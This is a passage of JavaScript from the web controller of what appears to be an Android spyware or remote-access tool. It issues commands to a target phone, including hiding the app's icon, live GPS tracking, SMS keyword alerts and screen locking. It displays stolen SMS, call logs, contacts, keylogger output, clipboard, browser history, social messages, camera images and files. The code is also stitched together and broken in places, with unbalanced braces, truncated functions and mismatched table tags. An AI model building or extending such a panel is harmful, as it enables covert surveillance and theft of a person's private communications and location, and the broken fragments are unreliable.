                a.click();
                URL.revokeObjectURL(url);
                screenRecordedChunks = [];
                showNotification('Recording saved');
            };
            screenMediaRecorder.start(1000);
            document.getElementById('modalRecordBtn').innerText = '🟢';
            showNotification('Recording started');
        }

        function toggleFullscreen() {
            const video = document.getElementById('modalScreenVideo');

            } else {
                document.exitFullscreen();
            }
        }

    `;
            panel.querySelectorAll('button[data-days]').forEach(btn => {

        async function loadAppUsageFromFirebase(days) {
            const container = document.getElementById('screenTimeData');
            if (!container) return;
            container.innerHTML = '<p>Loading...</p>';
            try {
                const now = new Date();
                const cutoff = new Date(now.getTime() - days * 86400000);
                const snapshot = await db.collection('devices').doc(selectedDeviceId).collection('app_usage')
                    .where('timestamp', '>=', cutoff)
                    .orderBy('timestamp', 'desc')
                    .get();
                if (snapshot.empty) {
                    container.innerHTML = '<p>No screen time data found in Firebase. The device app will upload usage stats every hour.</p>';
                    return;
                }
                const appTotals = new Map();
                snapshot.forEach(doc => {
                    const data = doc.data();
                    const apps = JSON.parse(data.apps);
                    if (Array.isArray(apps)) {
                        apps.forEach(app => {
                            const name = app.appName || app.packageName || 'Unknown';
                            const timeMs = app.totalTimeMs || 0;
                            if (appTotals.has(name)) {
                                appTotals.set(name, appTotals.get(name) + timeMs);
                            } else {
                                appTotals.set(name, timeMs);
                            }
                        });
                    }
                });
                if (appTotals.size === 0) {
                    container.innerHTML = '<p>No usage data for the selected period.</p>';
                    return;
                }
                const sorted = Array.from(appTotals.entries()).sort((a, b) => b[1] - a[1]);
                const max = sorted[0][1];
                let html = `<p>Showing aggregated usage for the last ${days} day(s).</p><div style="margin-top:16px;">`;
                for (let [name, timeMs] of sorted) {
                    const pct = max ? Math.round((timeMs / max) * 100) : 0;
                    const color = getColorForDuration(timeMs);
                    html += `
                <div class="app-usage-item">
                    <div class="app-usage-name">${escapeHtml(name)}</div>
                    <div class="usage-bar-container">
                        <div class="usage-bar" style="width:${pct}%; background-color:${color};"></div>
                    </div>
                    <div class="app-usage-time">${formatDuration(timeMs)}</div>
                </div>
            `;
                }
                html += '</div>';
                container.innerHTML = html;
            } catch (err) {
                console.error(err);
                container.innerHTML = '<p style="color:red;">Error loading screen time data: ' + err.message + '</p>';
            }
        }

                });

        // ==================== DATA DISPLAY FUNCTIONS ====================
        function renderTable(rows, headers) {
            const pageSize = 20;
            const totalPages = Math.ceil(rows.length / pageSize);
            const start = currentPage * pageSize;
            const pageRows = rows.slice(start, start + pageSize);
            let html = '<div style="overflow-x:auto;"><table><thead><tr>';
            headers.forEach(h => html += `<th>${h}</th>`);
            html += '</thead><tbody>';
            pageRows.forEach(r => {
                html += '<tr>';
                r.forEach(cell => html += `<td>${escapeHtml(cell || '')}<tr>`);
                html += '</tr>';
            });
            html += '</tbody></table></div>';
            if (totalPages > 1) {
                html += '<div class="pagination">';
                for (let i = 0; i < totalPages; i++) {
                    html += `<button class="page-btn" onclick="gotoPage(${i})">${i + 1}</button>`;
                }
                html += '</div>';
            }
            panel.innerHTML = html;
        }

        window.gotoPage = function (p) {
            currentPage = p;
            if (dataType === 'sms') renderTable(currentData, ['Type', 'Number', 'Message', 'Date']);
            else if (dataType === 'call') renderTable(currentData, ['Type', 'Number', 'Name', 'Date', 'Duration']);
            else if (dataType === 'contacts') renderTable(currentData, ['Name', 'Number', 'Times Contacted']);
            else if (dataType === 'wifi') renderTable(currentData, ['SSID', 'Signal', 'Status']);
        };

            document.getElementById('saveKw').onclick = () => { const raw = document.getElementById('kwInput').value.trim(); if (!raw) return showNotification('Enter at least one keyword'); const kws = raw.split(',').map(k => k.trim()).filter(k => k); sendCommand('SET_SMS_KEYWORDS', { keywords: kws }); };

        function toggleLiveGps() {
            liveGpsActive = !liveGpsActive;
            sendCommand(liveGpsActive ? 'START_GPS_UPDATES' : 'STOP_GPS_UPDATES');
            const btn = document.getElementById('liveGpsBtn');
            if (btn) {
                btn.style.background = liveGpsActive ? '#d32f2f' : '';
                btn.querySelector('span:last-child').textContent = liveGpsActive ? 'Stop GPS Track' : 'Live GPS Track';
            }
            if (liveGpsActive && currentLocation) {
                renderLiveMap(currentLocation.lat, currentLocation.lon, currentLocation.acc);
            } else if (!liveGpsActive) {
                panel.innerHTML = '<p>Live GPS tracking stopped.</p>';
                liveMap = null;
                liveMarker = null;
                liveCircle = null;
            }

        function toggleAppIcon() { sendCommand(iconHidden ? 'SHOW_APP' : 'HIDE_APP'); }
        function toggleFlash() { sendCommand(flashOn ? 'FLASH_OFF' : 'FLASH_ON'); }

        // ==================== MESSAGE HANDLER ====================
        function handleJSON(json) {
            if (Array.isArray(json)) {
                if (pendingCommand === 'LIST_FILES') { currentData = json; renderFiles(); }
                else if (pendingCommand === 'GET_SMS') { displaySMS(json); }
                else if (pendingCommand === 'GET_CALL_LOGS') { displayCallLogs(json); }
                else if (pendingCommand === 'GET_CONTACTS') { displayContacts(json); }
                else if (pendingCommand === 'GET_WIFI_NETWORKS') { displayWifiNetworks(json); }
                pendingCommand = null; return;
            }
            switch (json.type) {
                case 'FILE_LIST':
                    try {
                        const _fl = typeof json.data === 'string' ? JSON.parse(json.data) : json.data;
                        const _files = Array.isArray(_fl) ? _fl : [];
                        if (window.pendingFolderLoad) {
                            const { path: fPath, inner: fInner } = window.pendingFolderLoad;
                            fileTreeCache[fPath] = _files;
                            fInner.innerHTML = renderFileTreeNodes(_files, fPath);
                            attachFileEventListeners(fInner);
                            window.pendingFolderLoad = null;
                        } else {
                            fileTreeCache[currentPath || 'root'] = _files;
                            currentData = _files;
                            renderFiles();
                            attachFileEventListeners(document.getElementById('tree-root-container'));
                        }
                    } catch (e) { console.error('FILE_LIST error:', e); }
                    break;
                case 'SMS_DATA': try { displaySMS(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
                case 'CALL_LOGS': try { displayCallLogs(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
                case 'CONTACTS_DATA': try { displayContacts(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
                case 'WIFI_NETWORKS_DATA': try { displayWifiNetworks(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
                case 'SOCIAL_MESSAGES_DATA': try { displaySocialMessages(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
                case 'CAMERA_IMAGE': displayCapturedImage(json.data); break;
                case 'LOCATION_UPDATE':
                    if (liveGpsActive) {
                        const loc = json.data || json;
                        const lat = loc.lat || loc.latitude;
                        const lon = loc.lon || loc.longitude;
                        const acc = loc.accuracy || 10;
                        currentLocation = { lat, lon, acc };
                        if (liveMap) renderLiveMap(lat, lon, acc);
                        else renderLiveMap(lat, lon, acc);
                    } else {
                        renderMap(json.data || json);
                    }
                    break;
                case 'GEOFENCE_INFO': try { displayGeofenceInfo(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
                case 'FILE_INFO': fileTransfers[json.transferId] = { chunks: new Array(json.totalChunks), totalChunks: json.totalChunks, fileName: json.fileName, received: 0 }; document.getElementById('progressFileName').innerText = json.fileName; document.getElementById('progressPercent').innerText = '0%'; document.getElementById('progressBar').style.width = '0%'; document.getElementById('downloadProgress').style.display = 'block'; break;
                case 'FILE_CHUNK':
                    const tr = fileTransfers[json.transferId];
                    if (!tr) return;
                    setTimeout(() => {
                        try {
                            const bin = atob(json.data), bytes = new Uint8Array(bin.length);
                            for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
                            tr.chunks[json.chunkIndex] = bytes;
                            tr.received++;
                            const pct = Math.round((tr.received / tr.totalChunks) * 100);
                            document.getElementById('progressPercent').innerText = pct + '%';
                            document.getElementById('progressBar').style.width = pct + '%';
                            if (tr.received === tr.totalChunks) {
                                const blob = new Blob(tr.chunks), url = URL.createObjectURL(blob), a = document.createElement('a');
                                a.href = url;
                                a.download = tr.fileName;
                                a.click();
                                URL.revokeObjectURL(url);
                                delete fileTransfers[json.transferId];
                                document.getElementById('downloadProgress').style.display = 'none';
                                showNotification(`✅ Downloaded: ${tr.fileName}`);
                            }
                        } catch (e) {
                            showNotification('Chunk decode error');
                            delete fileTransfers[json.transferId];
                            document.getElementById('downloadProgress').style.display = 'none';
                        }
                    }, 0);
                    break;
                case 'FLASH_ON': flashOn = true; document.getElementById('flashBtn').innerText = 'Flash Off'; showNotification('🔦 Flashlight ON'); break;
                case 'FLASH_OFF': flashOn = false; document.getElementById('flashBtn').innerText = 'Flash On'; showNotification('🔦 Flashlight OFF'); break;
                case 'APP_HIDDEN': iconHidden = true; document.getElementById('iconBtn').innerText = 'Show Icon'; showNotification('App icon hidden'); break;
                case 'APP_SHOWN': iconHidden = false; document.getElementById('iconBtn').innerText = 'Hide Icon'; showNotification('App icon shown'); break;
                case 'INSTALLED_APPS': try { displayInstalledApps(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
                case 'APP_USAGE_DATA': try { displayAppUsage(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
                case 'BROWSER_HISTORY_DATA': try { displayBrowserHistory(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
                case 'KEYLOG_DATA': try { displayKeylog(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
                case 'CLIPBOARD_DATA': try { displayClipboard(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
                case 'RECENT_IMAGES_DATA': try { displayPhotoGallery(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
                case 'LOCATION_HISTORY_DATA': try { displayLocationHistory(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
                case 'APP_EVENTS_DATA': try { displayAppEvents(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
                case 'SMS_KEYWORDS_DATA': try { displaySmsKeywords(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
                case 'SMS_ALERTS_DATA': try { displaySmsAlerts(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
                case 'GEOFENCE_SET': showNotification('✅ Geofence activated'); break;
                case 'GEOFENCE_CLEARED': showNotification('Geofence cleared'); break;
                case 'GEOFENCE_ALERT': pushAlert('Geofence', json.event === 'EXIT' ? '🚨 DEVICE LEFT safe zone!' : '✅ Device returned to safe zone'); break;
                case 'SCHEDULED_CAPTURE_SET': showNotification('✅ Auto-capture started'); break;
                case 'SCHEDULED_CAPTURE_STOPPED': showNotification('Auto-capture stopped'); break;
                case 'DEVICE_LOCKED': showNotification('🔒 Screen locked'); break;
                case 'SMS_SENT': showNotification('✅ SMS sent successfully'); break;
                case 'FILE_DELETED': showNotification('File deleted'); sendCommand('LIST_FILES', { path: currentPath }); break;
                case 'VIBRATE_COMPLETE': showNotification('📳 Vibrated'); break;
                case 'GPS_UPDATES_STOPPED': liveGpsActive = false; const gpsBtn = document.getElementById('liveGpsBtn'); if (gpsBtn) { gpsBtn.querySelector('span:last-child').textContent = 'Live GPS Track'; gpsBtn.style.cssText = ''; } showNotification('GPS tracking stopped'); break;
                case 'NOTIFICATION_LIVE': pushAlert('📳 ' + (json.app || 'App'), (json.title || '') + ': ' + (json.text || '')); break;
                case 'CALL_ALERT': if (json.event === 'RINGING') pushAlert('📞 Incoming Call', (json.name || 'Unknown') + ' (' + (json.number || '') + ')'); else if (json.event === 'MISSED') pushAlert('📵 Missed Call', (json.name || 'Unknown') + ' (' + (json.number || '') + ')'); break;
                case 'SMS_KEYWORD_ALERT': pushAlert('🔑 Keyword: ' + json.keyword, 'From ' + json.from + ': ' + json.body); break;
                default: console.log('Unhandled type:', json.type);
            }
            pendingCommand = null;
        }

        function handlePlainText(msg) {
            if (msg.startsWith("CAMERA_IMAGE:")) displayCapturedImage(msg.substring(13));
            else if (msg.startsWith("FLASH_ON")) { flashOn = true; document.getElementById('flashBtn').innerText = 'Flash Off'; showNotification('Flash ON'); }
            else if (msg.startsWith("FLASH_OFF")) { flashOn = false; document.getElementById('flashBtn').innerText = 'Flash On'; showNotification('Flash OFF'); }
            else if (msg.startsWith("LOC_DATA:")) try { renderMap(JSON.parse(msg.substring(9))); } catch (e) { }
            else if (msg.startsWith("SMS_DATA:")) try { displaySMS(JSON.parse(msg.substring(9))); } catch (e) { }
            else if (msg.startsWith("CALL_DATA:")) try { displayCallLogs(JSON.parse(msg.substring(10))); } catch (e) { }
            else if (msg.startsWith("CONTACTS_DATA:")) try { displayContacts(JSON.parse(msg.substring(14))); } catch (e) { }
            else if (msg.startsWith("WIFI_DATA:")) try { displayWifiNetworks(JSON.parse(msg.substring(10))); } catch (e) { }
            else if (msg.startsWith('[') || msg.startsWith('{')) try { handleJSON(JSON.parse(msg)); } catch (e) { }
        }

        function handleIncomingMessage(msg) {
            try {
                const j = JSON.parse(msg);
                if (j.type === 'SIGNALING') handleSignaling(j.data);
                else handleJSON(j);
            } catch (e) {
                handlePlainText(msg);
            }
        }

            document.getElementById('smsKeywordsBtn').onclick = showSmsKeywordsPanel;

            document.getElementById('vibrateBtn').onclick = () => sendCommand('VIBRATE', { duration: 1000 });

            document.getElementById('clearAlertsBtn').onclick = clearAlerts;

        }

        auth.onAuthStateChanged(user => {

                isLoginMode = true;
                renderAuthForm();

        renderAuthForm();
        setupEvents();
    </script>
